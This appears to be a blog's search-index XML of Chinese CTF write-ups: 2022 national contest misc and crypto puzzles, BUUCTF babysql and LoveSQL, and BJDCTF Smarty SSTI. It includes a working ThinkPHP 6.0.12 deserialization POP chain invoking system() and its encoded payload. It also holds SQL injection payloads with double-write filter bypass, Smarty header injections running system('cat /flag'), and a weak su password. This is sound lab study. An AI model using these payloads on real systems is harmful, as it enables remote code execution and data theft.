<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022国赛部分wp</title>
    <url>/p/d8745dfd.html</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>直接填表拿到flag</p>
<h2 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h2><p>用010打开后面有一些hex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FB 3E FC E4 CE AC 2F 54 45 C7 AE 17 E3 E9 69 AB</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDGDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>暂时不知道啥用</p>
<p>继续看，用stegsolve打开</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDIDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>发现第二页右边有隐写的，接着发现它是竖着的，所以接着选择column</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDGDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f78dcd 383f1b5734624b 可能是什么密码</span><br></pre></td></tr></table></figure>

<p>联想到可能lsb，我们用clockpixel那个工具，跑跑看</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDGDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>在这个目录下用cmd命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python lsb.py extract 111.png out.txt f78dcd 383f1b5734624b</span><br></pre></td></tr></table></figure>

<p>生成一个out.txt文件</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDHDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>用010打开，知道是zip压缩包，改后缀打开，</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDHDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>显然是压缩包，但是需要一个密码</p>
<p>将最开始得到的hex,  一串MD5解密得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FB3EFCE4CEAC2F5445C7AE17E3E969AB</span><br><span class="line"></span><br><span class="line">解码</span><br><span class="line"></span><br><span class="line">ohhWh04m1</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDHDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>果然解出来了，用这个做密码去解压那个文件，</p>
<p>解压得到的文件是一个png，但是格式乱乱的</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDHDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>尝试改后缀为.data,拖到神器gimp里头看看</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDHDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>稍微调整下宽度</p>
<p><img src="https://c.img.dasctf.com/images/2022529/1653811934732-9fd3697b-9d81-42e7-8a29-258af27c0655.png" alt="image-20220529161211740"></p>
<p>拿到flag</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDFDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>按照题目意思取密码本前面的28位，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret = &quot;8436901094182633358417807982&quot;按照题目意思取密码本前面的28位，</span><br><span class="line">secret = secret[:28]</span><br><span class="line"></span><br><span class="line">flag = &quot;1732 2514 1344 0356 0451 6671 0055&quot;//标准点码表</span><br><span class="line">flag  = flag.replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(len(secret)):</span><br><span class="line">    print((int(secret[i]) + int(flag[i])) % 10 ,end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>脚步跑出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9168152407522989393573517937</span><br></pre></td></tr></table></figure>

<p>开启机器</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/send?msg=9168152407522989393573517937</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDFDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="基于挑战码的双向认证1"><a href="#基于挑战码的双向认证1" class="headerlink" title="基于挑战码的双向认证1"></a>基于挑战码的双向认证1</h2><p>题目给了finalshell，用玩家身份登录，</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDIDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDIDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>先使用命令返回上上级目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /..</span><br></pre></td></tr></table></figure>

<p>接着查找flag开头的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>

<p>找到后进入目录，命令获取flag即可。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDIDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h2><p>在基于挑战码的双向认证1的基础上cat 另一个flag2.txt文件，即可拿到flag</p>
<h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>和前两道一样，先链接上finalshell,接着也是查看flag文件在哪个文件里，</p>
<p>但这道题多了个要权限，,直接cat flag2.txt文件失败，所以使用su命令，输入密码位toor</p>
<p>//首先本道题目也是先登录进去，然后su进去，获取权限需要密码，然后随便试了了几个常用的密码，瞎试很多</p>
<p>次，发现toor可以进入权限（这也是弱口令密码了），之后的解法就和上面的一样了搜索flag ，进入到目录直接cat得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得权限    su 在输入密码    </span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDDDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>thinkphp6.0.12漏洞</p>
<p>路由形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/index/test</span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2zeh4pj6hmpfujmcljiq.cloudeci1.ichunqiu.com/index.php/index/test</span><br></pre></td></tr></table></figure>

<p>访问</p>
<p><a href="http://eci-2zeh4pj6hmpfujmcljiq.cloudeci1.ichunqiu.com/www/.zip">http://eci-2zeh4pj6hmpfujmcljiq.cloudeci1.ichunqiu.com/www/.zip</a></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDFDJDIDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>拿到源码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V&#x27; . \think\facade\App::version() . &#x27;&lt;br/&gt;&lt;span style=&quot;font-size:30px;&quot;&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:25px;&quot;&gt;[ V6.0 版本由 &lt;a href=&quot;https://www.yisu.com/&quot; target=&quot;yisu&quot;&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ee9b1aa918103c4fc&quot;&gt;&lt;/think&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function hello($name = &#x27;ThinkPHP6&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;hello,&#x27; . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function test()</span><br><span class="line">    &#123;</span><br><span class="line">   	unserialize($_POST[&#x27;a&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>知道要传入的参数为a</p>
<p>接着构造pop链，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\model\concern;</span><br><span class="line"></span><br><span class="line">trait Attribute</span><br><span class="line">&#123;</span><br><span class="line">    private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &#x27;cat$&#123;IFS&#125;/flag.txt&#x27;]];//命令执行</span><br><span class="line">    private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]];</span><br><span class="line">    protected $json = [&quot;key&quot;];</span><br><span class="line">&#125;</span><br><span class="line">namespace think;</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">    use model\concern\Attribute;</span><br><span class="line">    private $lazySave;</span><br><span class="line">    protected $withEvent;</span><br><span class="line">    private $exists;</span><br><span class="line">    private $force;</span><br><span class="line">    protected $table;</span><br><span class="line">    protected $jsonAssoc;</span><br><span class="line">    function __construct($obj = &#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;lazySave = true;</span><br><span class="line">        $this-&gt;withEvent = false;</span><br><span class="line">        $this-&gt;exists = true;</span><br><span class="line">        $this-&gt;force = true;</span><br><span class="line">        $this-&gt;table = $obj;</span><br><span class="line">        $this-&gt;jsonAssoc = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Pivot();</span><br><span class="line">$b = new Pivot($a);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A18%3A%22cat%24%7BIFS%7D%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A18%3A%22cat%24%7BIFS%7D%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p>传参数拿到flag：</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDEDGDBDGDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
]]></content>
      <categories>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>buu-babysql</title>
    <url>/p/a5cbd811.html</url>
    <content><![CDATA[<h3 id="极客大挑战：-babysql"><a href="#极客大挑战：-babysql" class="headerlink" title="极客大挑战： babysql"></a>极客大挑战： babysql</h3><p>首先这道题目我一开始尝试了万能钥匙 ，但是发现不行，但是可以肯定的是肯定存在注入的</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>但是爆了错误，但是细心看发现，or不见了应该是被过滤了，估计还过滤了好多东西，</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这样弄居然可以登录，拿到密码，但是没有什么用，其实下面的这些试查找的错误的步骤可以通过用户名排查看看是过滤了什么东西</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDGCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>继续尝试看看有没有将by也过滤掉了，1‘ order by 3 #结果真是也过滤了</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>于是尝试一下 双写绕过看看行不行，下面这样看其实双写就绕过去了，但是还有其他的一些错误报出来，经过测试发现其实字段就是3，到4就报错了</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDJCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDACPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>上面的验证用密码也是可以的。</p>
<p>另外 一种查看字段数的也可以用联合查询admin’ uunionnion sselectelect 1,2,3#，也是可以登录进去得到一些没用的东西的，因为union，select也被过滤了，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ab union bc select database() #语句查看可以发现</span><br></pre></td></tr></table></figure>

<p>而双写绕过也可以，尝试绕过也可以试一下大写，但是这里不行。</p>
<p>union和select都被过滤了 ，改造语句再查所有的库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) from information_schema.schemata)%23</span></span><br></pre></td></tr></table></figure>

<p>发现带from和information的被过滤了，于是依旧双写绕过，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?username=admin&amp;password=1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) frfromom infoorrmation_schema.schemata)%23</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>于是再查看表，注意那个where也是被绕过了，也是需要双写绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>最后再来爆破字段，自然很容易就得到了字段flag</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27; anandd table_name=&#x27;</span>Flag<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>

<p>最后拿数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect Flag frfromom ctf.Flag)%23</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>参考博客：<a href="https://blog.csdn.net/guo15890025019/article/details/120958556">https://blog.csdn.net/guo15890025019/article/details/120958556</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>XFF—SSTI</title>
    <url>/p/c3af6cda.html</url>
    <content><![CDATA[<h2 id="XFF漏洞浅析"><a href="#XFF漏洞浅析" class="headerlink" title="XFF漏洞浅析"></a>XFF漏洞浅析</h2><p>X-Forwarded-for：简称XFF，它代表客户端，也就是HTTP请求的真实IP，只有在通过了HTTP代理<br> 或者负载均衡器时才会添加该项。</p>
<h3 id="如何获取客户端IP"><a href="#如何获取客户端IP" class="headerlink" title="如何获取客户端IP"></a>如何获取客户端IP</h3><p>​    在Java中，获取客户端IP最直接的方式就是使用request.getRemoteAddr()。在中间没有代理的情况下，这是最简单有效的方式。</p>
<p>​    但是目前互联网Web应用很少会将应用服务器直接对外提供服务，一般都会有一层Nginx做反向代理和负载均衡，有的甚至可能有多层代理。在有反向代理的情况下，直接使用request.getRemoteAddr()获取到的IP地址是Nginx所在服务器的IP地址，而不是客户端的IP。</p>
<blockquote>
<p>HTTP协议是基于TCP协议的，由于request.getRemoteAddr()获取到的是TCP层直接连接的客户端的IP，对于Web应用服务器来说直接连接它的客户端实际上是Nginx，也就是TCP层是拿不到真实客户端的IP。</p>
</blockquote>
<h3 id="XFF字段"><a href="#XFF字段" class="headerlink" title="XFF字段"></a>XFF字段</h3><p>​    XFF(X-FORWARDED-FOR)是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。为了解决上面的问题，很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p>
<p><strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理3IP</span><br></pre></td></tr></table></figure>

<h3 id="XFF头ip追加原理"><a href="#XFF头ip追加原理" class="headerlink" title="XFF头ip追加原理"></a>XFF头ip追加原理</h3><p>总结来说就是添加的是请求来源的IP地址，在 <code>第一个代理处</code> 添加 <code>最原始的ip地址</code> ，在 <code>第二个代理处</code>添加 <code>第一个代理的ip地址</code>… 这样的错位的关系。一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（最左边第一个值）</p>
<p>下面看一到相关的题关于XFF的</p>
<p>另外还有关于ssti注入的，自行了解一下，还挺多知识点的</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p><a href="https://blog.csdn.net/huangyongkang666/article/details/123628875">https://blog.csdn.net/huangyongkang666/article/details/123628875</a></p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>打开题目发现这些东西，有个ip显示的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152218737.png" alt="image-20230415221803105"></p>
<p>抓包看看吧，窃取了IP，考虑是不是XFF或Client-IP这两个header，最后发现是ssti模板注入</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152218970.png" alt="image-20230415221856890"></p>
<p>看来wp发现是smart注入，Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。学一下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(‘文件路劲’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(‘文件路径’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(‘操作命令’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(‘操作命令’)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>在burp里面操作一下，经过测试发现Client-ip 和xff都是可以修改的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152226994.png" alt="image-20230415222633895"></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152226111.png" alt="image-20230415222656010"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-ip:&#123;system(&#x27;ls&#x27;)&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-for:&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152228794.png" alt="image-20230415222849686"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-ip:&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-for:&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152230026.png" alt="image-20230415223024961"></p>
<p>伪造方式一下两种都可以</p>
<p>1：通过hackbar插件x-forwarded-for直接改造</p>
<p>2：用burp抓包修改（ps:referer也可以修改，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。）</p>
<p>另外XFF sql注入还需要学习一下</p>
<p>参考文章：</p>
<p><a href="https://blog.51cto.com/u_14230175/5928139">https://blog.51cto.com/u_14230175/5928139</a></p>
<p><a href="https://www.cnblogs.com/02SWD/p/13256385.html">https://www.cnblogs.com/02SWD/p/13256385.html</a></p>
<p><a href="https://blog.csdn.net/m0_55109452/article/details/117474173">https://blog.csdn.net/m0_55109452/article/details/117474173</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>XFF-SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>lovesql</title>
    <url>/p/7625e5f3.html</url>
    <content><![CDATA[<h3 id="极客大挑战：LoveSql"><a href="#极客大挑战：LoveSql" class="headerlink" title="极客大挑战：LoveSql"></a>极客大挑战：LoveSql</h3><p>首先这道题目打开之后就是发现和前面几道差不多</p>
<p>一开始就是很常规的尝试嘛，首先就是使用一下万能钥匙，发现就是登陆成功了，给了你密码，但是很快就发现没什么用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>虽然有md5的值，但是解不了码</p>
<p>继续尝试，看看有没有绕过什么东西，好像没有，接下来看一下字段看看有多少</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure>

<p>没有报错，但是当4的时候，报错了，于是可以知道只有三个字段</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>爆破注入点</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3 #这样看也行</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>接下来就查看一下用户名和数据库名，其实简单的sql注入的基本流程都差不多，而且查询语句也是差不多的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select1,database(),user()#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>接着就是爆破库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

